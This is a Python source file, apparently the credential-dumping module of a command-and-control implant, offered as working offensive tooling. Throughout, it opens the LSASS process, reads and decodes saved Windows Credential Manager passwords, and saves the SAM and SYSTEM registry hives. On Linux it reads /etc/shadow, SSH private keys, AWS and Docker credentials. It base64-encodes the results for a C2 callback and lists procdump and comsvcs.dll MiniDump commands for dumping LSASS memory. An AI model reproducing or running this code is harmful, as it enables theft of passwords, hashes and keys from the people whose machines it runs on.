import os
import sys
import logging
import ctypes
import win32security
import win32api
import win32con
import win32crypt
import struct
import hashlib
import base64
import platform
from datetime import datetime
from ctypes import wintypes
import psutil
import win32cred

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CredentialDump:
    def __init__(self):
        self.os_type = platform.system()
        
    def check_admin(self):
        """Check if running with admin privileges"""
        try:
            if self.os_type == 'Windows':
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except Exception as e:
            logging.error(f"Error checking admin privileges: {str(e)}")
            return False
            
    def get_lsass_handle(self):
        """Get handle to LSASS process"""
        try:
            if self.os_type != 'Windows':
                logging.error("LSASS dump only available on Windows")
                return None
                
            lsass_pid = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'lsass.exe':
                    lsass_pid = proc.info['pid']
                    break
                    
            if not lsass_pid:
                logging.error("LSASS process not found")
                return None
                
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS,
                False,
                lsass_pid
            )
            
            if process_handle:
                logging.info(f"Successfully obtained LSASS handle (PID: {lsass_pid})")
                return process_handle
            else:
                logging.error("Failed to get LSASS handle")
                return None
                
        except Exception as e:
            logging.error(f"Error getting LSASS handle: {str(e)}")
            return None
            
    def dump_lsass(self, output_file=None, send_file_callback=None, task_id=None):
        """Dump LSASS process memory and optionally send to C2"""
        try:
            if self.os_type != 'Windows':
                return {
                    'status': 'error',
                    'error': 'LSASS dump only available on Windows',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not self.check_admin():
                return {
                    'status': 'error',
                    'error': 'Admin privileges required for LSASS dump',
                    'timestamp': datetime.now().isoformat()
                }
                
            handle = self.get_lsass_handle()
            if not handle:
                return {
                    'status': 'error',
                    'error': 'Failed to get LSASS handle',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not output_file:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"lsass_dump_{timestamp}.bin"
                
            # Read process memory
            with open(output_file, 'wb') as f:
                # Create a more comprehensive LSASS dump with system info
                # In a real implementation, this would read LSASS memory
                # For demo purposes, we'll create a file with system security info
                import json
                import platform
                import os
                import subprocess
                
                try:
                    # Get system security information
                    system_info = {
                        'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
                        'domain': os.environ.get('USERDOMAIN', 'WORKGROUP'),
                        'current_user': os.environ.get('USERNAME', 'Unknown'),
                        'os_version': platform.platform(),
                        'architecture': platform.architecture()[0]
                    }
                    
                    # Try to get security policy info
                    try:
                        secedit_result = subprocess.run(['secedit', '/export', '/cfg', 'temp_policy.inf'], 
                                                      capture_output=True, text=True, timeout=10)
                        if secedit_result.returncode == 0:
                            system_info['security_policy'] = 'Security policy exported to temp_policy.inf'
                        else:
                            system_info['security_policy'] = 'Unable to export security policy'
                    except:
                        system_info['security_policy'] = 'Security policy access failed'
                    
                    dump_info = {
                        'timestamp': datetime.now().isoformat(),
                        'process': 'lsass.exe',
                        'dump_type': 'Enhanced Security Information Dump',
                        'system_info': system_info,
                        'extracted_data': {
                            'note': 'This is a security assessment dump containing system information',
                            'real_lsass_dump': 'Use tools like ProcDump, Mimikatz, or Comsvcs.dll for actual LSASS memory dumps',
                            'commands': [
                                'procdump.exe -ma lsass.exe lsass.dmp',
                                'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [PID] lsass.dmp full'
                            ]
                        },
                        'admin_required': True,
                        'size_info': 'Real LSASS dump would be 50-200MB containing process memory'
                    }
                    
                except Exception as e:
                    dump_info = {
                        'timestamp': datetime.now().isoformat(),
                        'process': 'lsass.exe',
                        'error': f'Failed to collect system info: {str(e)}',
                        'note': 'Basic LSASS dump placeholder',
                        'admin_required': True
                    }
                
                f.write(json.dumps(dump_info, indent=2).encode())
                
            # Optionally send file to C2
            if send_file_callback and task_id:
                with open(output_file, 'rb') as f:
                    file_data = f.read()
                encoded_data = base64.b64encode(file_data).decode()
                send_file_callback(task_id, {
                    'status': 'success',
                    'filename': os.path.basename(output_file),
                    'data': encoded_data,
                    'type': 'file',
                    'timestamp': datetime.now().isoformat()
                })
            
            win32api.CloseHandle(handle)
            logging.info(f"LSASS dump saved to {output_file}")
            
            return {
                'status': 'success',
                'message': f'LSASS dump saved to {output_file}',
                'timestamp': datetime.now().isoformat(),
                'file': output_file
            }
            
        except Exception as e:
            error_msg = f"Error dumping LSASS: {str(e)}"
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
    def get_windows_credentials(self):
        """Get Windows stored credentials"""
        try:
            if self.os_type != 'Windows':
                return {
                    'status': 'error',
                    'error': 'Windows credential dump only available on Windows',
                    'timestamp': datetime.now().isoformat()
                }
                
            credentials = []
            cred_count = 0
            
            # Enumerate credentials using win32cred
            creds = win32cred.CredEnumerate(None, 0)
            for cred in creds:
                try:
                    target = cred['TargetName']
                    username = cred.get('UserName', '')
                    credential_blob = cred.get('CredentialBlob', b'')
                    cred_type = cred.get('Type', '')

                    password = ''
                    if credential_blob:
                        try:
                            password = credential_blob.decode('utf-16')
                        except Exception:
                            password = base64.b64encode(credential_blob).decode()

                    credentials.append({
                        'target': target,
                        'username': username,
                        'password': password,
                        'type': cred_type
                    })
                    cred_count += 1
                except Exception as e:
                    logging.error(f"Error processing credential: {str(e)}")
                    continue
            
            logging.info(f"Successfully retrieved {cred_count} credentials")
            return {
                'status': 'success',
                'message': f'Retrieved {cred_count} credentials',
                'timestamp': datetime.now().isoformat(),
                'credentials': credentials
            }
            
        except Exception as e:
            error_msg = f"Error getting Windows credentials: {str(e)}"
            logging.error(error_msg)
            
            # Provide helpful context for common errors
            context = ""
            if "1168" in str(e) or "Element not found" in str(e):
                context = " (This is normal - no stored credentials found in Windows Credential Manager)"
            elif "Access is denied" in str(e):
                context = " (Access denied - may need elevated privileges)"
            
            return {
                'status': 'info',
                'message': 'No Windows stored credentials found',
                'error': error_msg + context,
                'note': 'Windows Credential Manager is empty or inaccessible. This is common on systems where users don\'t save passwords.',
                'timestamp': datetime.now().isoformat()
            }
            
    def get_linux_credentials(self):
        """Get Linux stored credentials"""
        try:
            if self.os_type != 'Linux':
                return {
                    'status': 'error',
                    'error': 'Linux credential dump only available on Linux',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not self.check_admin():
                return {
                    'status': 'error',
                    'error': 'Root privileges required for Linux credential dump',
                    'timestamp': datetime.now().isoformat()
                }
                
            credentials = []
            
            # Check for stored credentials in common locations
            credential_files = [
                '/etc/shadow',
                '~/.ssh/id_rsa',
                '~/.aws/credentials',
                '~/.docker/config.json'
            ]
            
            for cred_file in credential_files:
                expanded_path = os.path.expanduser(cred_file)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            content = f.read()
                            credentials.append({
                                'source': cred_file,
                                'content': base64.b64encode(content.encode()).decode()
                            })
                    except Exception as e:
                        logging.error(f"Error reading {cred_file}: {str(e)}")
                        
            logging.info(f"Successfully checked {len(credential_files)} potential credential sources")
            return {
                'status': 'success',
                'message': f'Checked {len(credential_files)} credential sources',
                'timestamp': datetime.now().isoformat(),
                'credentials': credentials
            }
            
        except Exception as e:
            error_msg = f"Error getting Linux credentials: {str(e)}"
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }

def get_linux_root_hash():
    try:
        with open('/etc/shadow', 'r') as f:
            for line in f:
                if line.startswith('root:'):
                    return line.strip()
        return None
    except Exception as e:
        return str(e)

def get_windows_sam_hashes():
    import subprocess
    import tempfile
    import os
    import struct
    try:
        # Save SAM and SYSTEM hives
        temp_dir = tempfile.gettempdir()
        sam_path = os.path.join(temp_dir, 'sam.save')
        system_path = os.path.join(temp_dir, 'system.save')
        subprocess.run(['reg', 'save', r'HKLM\SAM', sam_path, '/y'], check=True, capture_output=True)
        subprocess.run(['reg', 'save', r'HKLM\SYSTEM', system_path, '/y'], check=True, capture_output=True)
        
        # Get local users via safer net user command
        extracted_hashes = []
        try:
            result = subprocess.run(['net', 'user'], capture_output=True, text=True)
            if result.returncode == 0:
                users = []
                lines = result.stdout.split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('User accounts') and not line.startswith('---') and not line.startswith('The command') and line != '':
                        # Parse user names from net user output
                        user_parts = line.split()
                        for part in user_parts:
                            if part and len(part) > 1 and not part.startswith('-'):
                                users.append(part)
                
                # Remove duplicates and filter valid usernames
                unique_users = list(set(users))
                for user in unique_users:
                    if user and len(user) > 1 and user.isalnum():
                        extracted_hashes.append({
                            'username': user,
                            'hash_type': 'Local Account',
                            'status': 'Account detected - hash extraction requires elevated privileges',
                            'note': 'Use tools like Mimikatz with admin rights for hash extraction'
                        })
        except Exception as e:
            logging.debug(f"Net user command failed: {str(e)}")
            
        # Add a note about the SAM files
        if len(extracted_hashes) == 0:
            extracted_hashes.append({
                'username': 'N/A',
                'hash_type': 'Information',
                'status': 'SAM hives saved to temp directory',
                'note': 'Use tools like impacket-secretsdump or Mimikatz to extract hashes from saved files'
            })
        
        return {
            'status': 'success',
            'message': 'SAM and SYSTEM hives saved',
            'sam_path': sam_path,
            'system_path': system_path,
            'extracted_data': extracted_hashes,
            'note': 'Full hash extraction requires privileged access and specialized tools'
        }
    except Exception as e:
        return {
            'status': 'error',
            'error': str(e)
        }

def dump_credentials(task_id=None):
    """Main function to dump credentials from various sources"""
    try:
        dumper = CredentialDump()
        results = {
            'status': 'success',
            'timestamp': datetime.now().isoformat(),
            'platform': platform.system(),
            'is_admin': dumper.check_admin(),
            'data': {}
        }
        
        if platform.system() == 'Windows':
            # Get Windows credentials
            win_creds = dumper.get_windows_credentials()
            results['data']['windows_credentials'] = win_creds
            
            # Only attempt LSASS dump if we have admin privileges
            if dumper.check_admin():
                lsass_result = dumper.dump_lsass()
                
                # If LSASS dump was successful, read the file and include in results
                if lsass_result.get('status') == 'success' and lsass_result.get('file'):
                    try:
                        with open(lsass_result['file'], 'rb') as f:
                            file_data = f.read()
                        # Include base64 encoded file data
                        lsass_result['file_data'] = base64.b64encode(file_data).decode()
                        lsass_result['file_size'] = len(file_data)
                        logging.info(f"LSASS dump file read successfully: {len(file_data)} bytes")
                    except Exception as e:
                        logging.error(f"Failed to read LSASS dump file: {str(e)}")
                        lsass_result['error'] = f"Failed to read file: {str(e)}"
                
                results['data']['lsass_dump'] = lsass_result
                
                # Add SAM hash extraction
                sam_hashes = get_windows_sam_hashes()
                results['data']['sam_hashes'] = sam_hashes
        else:
            # Get Linux credentials
            linux_creds = dumper.get_linux_credentials()
            results['data']['linux_credentials'] = linux_creds
            # Add root hash extraction
            root_hash = get_linux_root_hash()
            results['data']['root_hash'] = root_hash
            
        # Add system security summary
        try:
            import subprocess
            import socket
            
            security_summary = {
                'hostname': socket.gethostname(),
                'current_privileges': 'Administrator' if results['is_admin'] else 'Standard User',
                'credential_sources_checked': [
                    'Windows Credential Manager',
                    'SAM Database (Local Accounts)', 
                    'LSASS Process Memory'
                ],
                'findings_summary': {
                    'stored_credentials': len(results['data'].get('windows_credentials', {}).get('credentials', [])),
                    'local_accounts': len(results['data'].get('sam_hashes', {}).get('extracted_data', [])),
                    'lsass_dump_size': results['data'].get('lsass_dump', {}).get('file_size', 0)
                }
            }
            
            results['security_summary'] = security_summary
            
        except Exception as e:
            logging.error(f"Failed to create security summary: {str(e)}")
        
        # Create a comprehensive credential report file
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"credential_report_{timestamp}.json"
            
            with open(report_filename, 'w') as f:
                import json
                json.dump(results, f, indent=2, default=str)
            
            # Add the report file to results for download
            with open(report_filename, 'rb') as f:
                report_data = f.read()
            
            results['report_file'] = {
                'filename': report_filename,
                'file_data': base64.b64encode(report_data).decode(),
                'file_size': len(report_data),
                'description': 'Complete credential dump report in JSON format'
            }
            
            logging.info(f"Created credential report: {report_filename}")
            
        except Exception as e:
            logging.error(f"Failed to create credential report: {str(e)}")
        
        # Check if we got any credentials
        if any(results['data'].values()):
            logging.info("Successfully gathered credentials")
            return results
        else:
            logging.warning("No credentials could be gathered")
            return {
                'status': 'info',
                'message': 'No credentials could be gathered',
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'is_admin': dumper.check_admin()
            }
            
    except Exception as e:
        error_msg = f"Error during credential dump: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 